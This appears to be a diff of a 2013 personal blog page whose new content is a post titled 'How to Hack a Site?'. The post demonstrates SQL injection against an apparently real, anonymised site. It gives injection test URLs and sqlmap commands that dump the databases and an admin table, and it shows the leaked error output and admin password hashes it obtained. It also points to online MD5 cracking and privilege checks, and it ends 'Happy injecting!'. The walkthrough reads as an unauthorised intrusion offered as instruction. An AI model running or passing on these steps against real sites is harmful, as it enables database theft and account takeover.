@@ -3,10 +3,11 @@
 <html>
 <head>
 	<meta charset="utf-8">
-	<title>Blog Archives - A blog of wliao</title>
+	<title>How to hack a site? - A blog of wliao</title>
     <meta name="author" content="wliao">
     
-	<meta name="description" content="2013 How to hack a site? Apr 16 Security Diving Into Damai.cn-Part2 Mar 27 ActionScript, Sniff, Web Diving Into Damai.cn-Part1 Mar 25 ActionScript, &hellip;">
+	<meta name="description" content="I&#8217;m quite new to web security. But today, I want to show you how to
+hack a site and try best to get privilege. Spot Flaws There are million &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -99,144 +100,208 @@
 <div id="toload">
 <!-- begin toload --> 
     <div id="content" class="inner">
-        
+        <article class="post">
+	<h2 class="title">How to Hack a Site?</h2>
+	<div class="entry-content"><p>I&#8217;m quite new to web security. But today, I want to show you how to
+hack a site and try best to get privilege.</p>
+
+<h2>Spot Flaws</h2>
+
+<p>There are million ways to find flaws in web sites. Anyway, we should
+firstly be familiar with the commons ones. IMHO, the best reference is
+<a href="https://www.owasp.org/index.php/Main_Page">OWASP</a>.</p>
+
+<p>OWASP
+<a href="https://www.owasp.org/index.php/Top_10_2013-T10">top ten application security risks</a>
+are:</p>
+
+<ol>
+<li>Injection flaws.</li>
+<li>Broken Authentication and Session Management.</li>
+<li>XSS(Cross Site Scripting).</li>
+<li>Insecure Direct Object Reference.</li>
+<li>Security Misconfiguration.</li>
+<li>Sensitive Data Exposure.</li>
+<li>Missing Function Level Access Control.</li>
+<li>CSRF(Cross Site Request Forgery).</li>
+<li>Using Components with known vulnerabilities.</li>
+<li>Unvalidated Redirects and Forwards.</li>
+</ol>
+
+
+<p>These flaws while stand alone but are often tightly related which
+when integrated poses greater risk. As I&#8217;m lazy and impatient, I often
+just check the top five ones.</p>
+
+<h2>Injection Flaws</h2>
+
+<p>Almost everyone knows about
+<a href="http://en.wikipedia.org/wiki/SQL_Injection">SQL Injection</a>. It&#8217;s also
+our main role today. If you are not so familiar with <em>SQL Injection</em>,
+it&#8217;s best to read the article on wikipedia and
+<a href="https://www.owasp.org/index.php/SQL_Injection">OWASP</a>.</p>
+
+<h2>Identify Injection Flaws</h2>
+
+<p>I often test injection flaws manually by inspecting the parameters in
+<em>GET</em> or <em>POST</em>. This filters quite a few potential targets, but it&#8217;s
+off top here.</p>
+
+<p>The simplest test vector goest like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://mysite.com/para=1' or '1'='1' --'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&#8217;s your luck if the site doesn&#8217;t turn error debugging information
+off.</p>
+
+<p>So, here we go:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://some.com/questions?question_id=1'%20or%201=1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we get:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>A Database Error Occurred
+</span><span class='line'>
+</span><span class='line'>Error Number: 1064
+</span><span class='line'>
+</span><span class='line'>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''and type='Q'' at line 1
+</span><span class='line'>
+</span><span class='line'>SELECT * FROM t_qa_post WHERE id='1' or 1=1'and type='Q'
+</span><span class='line'>
+</span><span class='line'>Filename: /srv/www/default/models/t_db_model.php
+</span><span class='line'>
+</span><span class='line'>Line Number: 340</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool. The error is just what we want.
+A better one goes like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://some.com/question?question_id=1'%20or%201=1--'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This dumps all the questions. And we can at this point confirm the
+existence of injection flaws here.</p>
+
+<h2>Automation</h2>
+
+<p>There is no way you are willing to type all the test vectors into the
+parameters to get useful information. We need something to automate
+this process.</p>
+
+<p>Yeah, we got <a href="http://sqlmap.org/">sqlmap</a>. The best SQL injection
+automation tools I&#8217;ve ever seen. Read the manual, and get your hands
+dirty.</p>
+
+<h2>Lend hands from sqlmap</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#dump databases</span>
+</span><span class='line'><span class="nv">$ </span>./sqlmap.py -u
+</span><span class='line'><span class="s1">&#39;http://some.com/questions?question_id=1&#39;</span> -p
+</span><span class='line'>question_id --answers<span class="o">=</span><span class="nv">follow</span><span class="o">=</span>N --dbs
+</span><span class='line'><span class="c">#dump admins</span>
+</span><span class='line'><span class="nv">$ </span>sqlmap.py -u <span class="s1">&#39;http://some.com/questions?question_id=1&#39;</span> -p question_id --answers<span class="o">=</span><span class="nv">follow</span><span class="o">=</span>N -D svowdb_20120910 -T t_admin --dump
+</span><span class='line'>recognized possible password hashes in column <span class="s1">&#39;passwd&#39;</span>. Do you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q<span class="o">]</span> n
+</span><span class='line'>Database: svowdb_20120910
+</span><span class='line'>Table: t_admin
+</span><span class='line'><span class="o">[</span>2 entries<span class="o">]</span>
+</span><span class='line'>+--------------------------------------+----------------------------------+-----------+
+</span><span class='line'>| id                                   | passwd                           | nickname  |
+</span><span class='line'>+--------------------------------------+----------------------------------+-----------+
+</span><span class='line'>| 795bae94-afbe-11e1-94f9-bcaec51b9163 | 10032586bc62852d2a7ed121da58d05f | sab       |
+</span><span class='line'>| 84290d62-afbe-11e1-94f9-bcaec51b9163 | 4f490fc6fad84a18aa7a62dd00da7bf9 | yoyoooooo |
+</span><span class='line'>+--------------------------------------+----------------------------------+-----------+
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Reverse MD5 hash</h2>
+
+<p>Obviously the passwords as md5 hashed. There is no way but to
+decrypt the hashes. I don&#8217;t want to do it on my own, so I often search
+online md5 hash databases. The best I found is
+<a href="http://www.md5decrypter.co.uk/">md5decryptor</a>.</p>
+
+<h2>Privilege Elevation</h2>
+
+<p>It&#8217;s quite a pity that current database user got no privileges(Plus
+one for the right choice here :).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sqlmap.py -u <span class="s1">&#39;http://some.com/questions?question_id=1&#39;</span> -p question_id --answers<span class="o">=</span><span class="nv">follow</span><span class="o">=</span>N --privileges
+</span><span class='line'>database management system users privileges:
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;php&#39;</span>@<span class="s1">&#39;%&#39;</span> <span class="o">[</span>1<span class="o">]</span>:
+</span><span class='line'>    privilege: USAGE
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With more privilege, we can even dump files, execute arbitrary code,
+almost everything.</p>
+
+<p>If I find one, there maybe one more post.</p>
+
+<p>Happy injecting!</p>
+</div>
+
+<div class="meta">
 	
-
-
-	
-	
-	<section class="archives"><h1 class="year">2013</h1>
-
-<article>
-	<h2 class="title"><a href="/blog/2013/04/16/how-to-hack-a-site/">How to hack a site?</a></h2>
-	<div class="meta">
-		<span class="date">Apr 16</span>
-		<span class="tags">
-
-
-	<a class='category' href='/blog/categories/security/'>Security</a>
-
-
-</span>
-	    
-	</div>
+</div>
 </article>
 
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
 	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2013/03/27/diving-into-damai-dot-cn-part2/">Diving Into Damai.cn-Part2</a></h2>
-	<div class="meta">
-		<span class="date">Mar 27</span>
-		<span class="tags">
-
-
-	<a class='category' href='/blog/categories/actionscript/'>ActionScript</a>, <a class='category' href='/blog/categories/sniff/'>Sniff</a>, <a class='category' href='/blog/categories/web/'>Web</a>
-
-
-</span>
-	    
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
 	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2013/03/25/diving-into-damai-dot-cn-part1/">Diving Into Damai.cn-Part1</a></h2>
-	<div class="meta">
-		<span class="date">Mar 25</span>
-		<span class="tags">
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
 
 
-	<a class='category' href='/blog/categories/actionscript/'>ActionScript</a>, <a class='category' href='/blog/categories/sniff/'>Sniff</a>, <a class='category' href='/blog/categories/web/'>Web</a>
+<script type="text/javascript" src="/javascripts/sidelegend.js"></script>
 
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
 
-</span>
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2013/03/19/just-love-mayday/">Just love mayday</a></h2>
-	<div class="meta">
-		<span class="date">Mar 19</span>
-		<span class="tags">
-
-
-	<a class='category' href='/blog/categories/web/'>web</a>
-
-
-</span>
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2013/03/15/sina-oauth/">Sina OAuth</a></h2>
-	<div class="meta">
-		<span class="date">Mar 15</span>
-		<span class="tags">
-
-
-	<a class='category' href='/blog/categories/http/'>Http</a>, <a class='category' href='/blog/categories/web/'>Web</a>
-
-
-</span>
-	    
-	</div>
-</article>
-
-	
-
-
-	
-	
-		</section>
-	
-	<section class="archives"><h1 class="year">2012</h1>
-
-<article>
-	<h2 class="title"><a href="/blog/2012/01/05/new-post/">Ender.js vs Jquery.js</a></h2>
-	<div class="meta">
-		<span class="date">Jan  5</span>
-		<span class="tags">
-
-</span>
-	    
-	</div>
-</article>
-
-	
-
-
-	
-	
-		</section>
-	
-	<section class="archives"><h1 class="year">2011</h1>
-
-<article>
-	<h2 class="title"><a href="/blog/2011/11/30/f-number-starter/">F# starter</a></h2>
-	<div class="meta">
-		<span class="date">Nov 30</span>
-		<span class="tags">
-
-
-	<a class='category' href='/blog/categories/fp/'>FP</a>
-
-
-</span>
-	    
-	</div>
-</article>
 
     </div>
     <footer id="footer">
@@ -263,7 +328,10 @@
       var disqus_shortname = 'wliaosblog';
       
         
-        var disqus_script = 'count.js';
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://liaowang11.github.com/blog/2013/04/16/how-to-hack-a-site/';
+        var disqus_url = 'http://liaowang11.github.com/blog/2013/04/16/how-to-hack-a-site/';
+        var disqus_script = 'embed.js';
       
     (function () {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
